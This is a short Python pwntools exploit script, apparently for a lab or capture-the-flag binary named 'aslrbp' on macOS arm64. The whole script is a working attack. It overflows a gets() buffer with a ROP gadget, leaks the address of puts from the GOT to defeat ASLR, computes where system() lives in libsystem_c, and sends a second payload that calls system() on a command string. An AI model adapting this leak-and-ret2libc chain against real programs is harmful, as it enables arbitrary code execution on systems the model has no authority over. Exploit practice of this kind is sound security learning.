from pwn import *
context.log_level = 'DEBUG'

puts = p64(0x1000005D4)
puts_got = p64(0x100004008)
ldp_x0_x30 = p64(0x100000564)
ls = p64(0x100008000)
win = p64(0x100000550)
func = p64(0x10000057C)
main = p64(0x10000059C)

slide_to_system = 0x77368 # libsystem_c.dylib + system_addr
slide_to_puts = 0x2cb4c # libsystem_c.dylib + puts_addr

p = process(["./aslrbp", "./10"])

payload = b"A"*16 + ldp_x0_x30 + puts_got + puts
p.sendlineafter(b"warning: this program uses gets(), which is unsafe.", payload)
raw = p.recvn(6).replace(b"\n", b"")
hexstr = raw[::-1].hex()
puts = int(hexstr, 16)
libsystem_c_base = puts - slide_to_puts
system_addr = p64(libsystem_c_base + slide_to_system)
print(f"ANDRD3V WE HERE - ADDR OF system(): {system_addr}")
p.interactive()
p.kill()

p = process(["./aslrbp", "./10"])
payload = b"A"*16 + ldp_x0_x30 + ls + system_addr
p.sendlineafter(b"warning: this program uses gets(), which is unsafe.", payload)
p.interactive()
p.kill()
